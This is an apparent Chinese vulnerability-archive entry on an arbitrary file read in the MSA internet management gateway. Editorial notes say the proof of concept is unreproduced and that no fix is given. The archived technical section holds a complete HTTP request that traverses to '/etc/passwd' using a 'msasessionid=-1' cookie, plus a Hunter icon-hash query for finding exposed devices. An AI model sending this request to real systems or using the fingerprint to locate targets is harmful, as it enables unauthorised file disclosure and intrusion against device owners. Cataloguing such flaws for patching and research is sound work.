---
source: "wy876 漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "MSA互联网管理网关msa任意文件下载漏洞"
product: "MSA互联网管理网关"
record_type: "vulnerability"
document_type: "任意文件读取简要PoC"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "版本未给，Cookie设msasessionid=-1意义未解释；服务保留原始../路径条件"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/MSA%E4%BA%92%E8%81%94%E7%BD%91%E7%AE%A1%E7%90%86%E7%BD%91%E5%85%B3msa%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
fofa_unverified: "web.icon=="
hunter: "web.icon==\"73043af39b293ade8de257c2370de7bd\""
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gysgn5ydeuqlba2w"
id: "vw-a729f3a0e2e06ca1457ee615"
entity_id: "ve-a729f3a0e2e06ca1457ee615"
schema_version: "1"
---

# MSA互联网管理网关msa任意文件下载漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：MSA互联网管理网关
- 文献类型：任意文件读取简要PoC
- 版本、权限及部署边界：版本未给，Cookie设msasessionid=-1意义未解释；服务保留原始../路径条件
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. frontmatter fofa=web.icon==残缺且实际正文Hunter语法，需分引擎保存完整指纹
2. 未提供任何响应/图片证明与修复方案；任意文件受进程读权限限制，需明确是否未认证
3. 路径可能被客户端规范化，需注明原始请求并非浏览器普通URL等价；源语雀链接可追溯但无厂商范围

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://www.yuque.com/xiaokp7/ocvun2/gysgn5ydeuqlba2w>
- 原文参考链接（未重新核验）：<https://github.com/wy876/POC>

### 归档技术正文

# 一、漏洞简介
MSA 互联网管理网关存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器任意文件

# 二、影响版本
+ MSA 互联网管理网关

# 三、资产测绘
+ hunter`web.icon=="73043af39b293ade8de257c2370de7bd"`
+ 特征


# 四、漏洞复现
```plain
GET /msa/../../../../etc/passwd HTTP/1.1
Host: xx.xx.xx.xx
Cookie: msasessionid=-1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gysgn5ydeuqlba2w>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
